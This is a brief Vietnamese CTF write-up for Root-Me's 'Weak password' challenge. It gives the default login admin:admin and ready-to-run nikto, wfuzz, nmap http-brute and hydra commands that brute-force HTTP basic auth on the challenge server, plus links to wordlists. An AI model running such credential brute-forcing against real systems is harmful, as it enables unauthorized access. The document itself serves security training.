---
title: Weak password
date: '2022-08-31'
tags: ['root-me', 'writeups','web','server','weakpassword']
draft: false
summary: Writeup of Weak password challenges.
---

#Bài này có rất nhiều cách:

**Option1, test thử account 1 phát ăn luôn**
``` admin:admin```

**Option2, dùng 1 bash trong list dưới đây đều được:**

- nikto: 
```bash 
$ nikto -host http://challenge01.root-me.org/web-serveur/ch3/ 
```

- wfuzz: 
```bash 
$ wfuzz -c -w /usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt --basic admin:FUZZ http://challenge01.root-me.org/web-serveur/ch3/ 
```

- nmap: 
```shsh 
$ nmap -d -vv -p 80 --script http-brute --script-args http-brute.path=/web-serveur/ch3/ challenge01.root-me.org
```

- hydra:  
```sh 
$ hydra -L userList.txt -P passwordsList.txt 212.129.38.224 http-head /web-serveur/ch3/ 
```

  - users list inspired by http://blog.infowebmaster.fr/public/resource/wordpress-brute-force-login-a-eviter.txt
  - passwords list downloaded from http://blog.teckn0.com/wp-content/uploads/brute_force/Liste_mot_%20anglais.7z
